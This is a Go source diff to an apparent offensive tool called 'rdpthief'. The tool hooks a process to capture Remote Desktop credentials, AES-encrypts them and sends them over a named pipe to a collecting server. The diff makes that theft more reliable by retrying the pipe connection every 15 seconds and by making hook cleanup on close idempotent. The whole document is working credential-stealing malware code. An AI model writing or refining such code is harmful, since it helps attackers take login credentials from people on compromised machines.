@@ -5,6 +5,7 @@ package rdpthief
 import (
 	"context"
 	"crypto/sha256"
+	"net"
 	"sync"
 	"time"
 
@@ -34,9 +35,10 @@ type Client struct {
 	cbc    *aes.CBC
 	hook   *Hook
 
-	ctx    context.Context
-	cancel context.CancelFunc
-	wg     sync.WaitGroup
+	closeOnce sync.Once
+	ctx       context.Context
+	cancel    context.CancelFunc
+	wg        sync.WaitGroup
 }
 
 // NewClient is used to create a rdpthief client.
@@ -52,13 +54,13 @@ func NewClient(pipeName, password string) (*Client, error) {
 		return nil, err
 	}
 	client.cbc = cbc
-	client.hook = NewHook(client.recordCred)
 	client.ctx, client.cancel = context.WithCancel(context.Background())
-	err = client.hook.Install()
+	hook := NewHook(client.recordCred)
+	err = hook.Install()
 	if err != nil {
-		client.hook.Clean()
 		return nil, err
 	}
+	client.hook = hook
 	client.wg.Add(1)
 	go client.sendCredLoop()
 	return &client, nil
@@ -90,14 +92,23 @@ func (client *Client) sendCredLoop() {
 
 func (client *Client) sendCred(cred *Credential) {
 	// connect to the rdpthief server
-	ctx, cancel := context.WithTimeout(client.ctx, 10*time.Second)
-	defer cancel()
-	pipe, err := winio.DialPipeContext(ctx, `\\.\pipe\`+client.pipeName)
-	if err != nil {
-		return
+	var (
+		pipe net.Conn
+		err  error
+	)
+	for {
+		pipe, err = client.connect()
+		if err == nil {
+			break
+		}
+		select {
+		case <-time.After(15 * time.Second):
+		case <-client.ctx.Done():
+			return
+		}
 	}
 	defer func() { _ = pipe.Close() }()
-
+	// send credential
 	data, err := msgpack.Marshal(cred)
 	if err != nil {
 		return
@@ -111,13 +122,19 @@ func (client *Client) sendCred(cred *Credential) {
 	_, _ = pipe.Write(enc)
 }
 
-func (client *Client) Close() error {
-	client.cancel()
-	client.wg.Wait()
-	err := client.hook.Uninstall()
-	if err != nil {
-		return err
-	}
-	client.hook.Clean()
-	return nil
+func (client *Client) connect() (net.Conn, error) {
+	ctx, cancel := context.WithTimeout(client.ctx, 10*time.Second)
+	defer cancel()
+	return winio.DialPipeContext(ctx, `\\.\pipe\`+client.pipeName)
+}
+
+// Close is used to close client, it will uninstall hook.
+func (client *Client) Close() (err error) {
+	client.closeOnce.Do(func() {
+		client.cancel()
+		client.wg.Wait()
+		err = client.hook.Uninstall()
+		client.hook = nil
+	})
+	return
 }
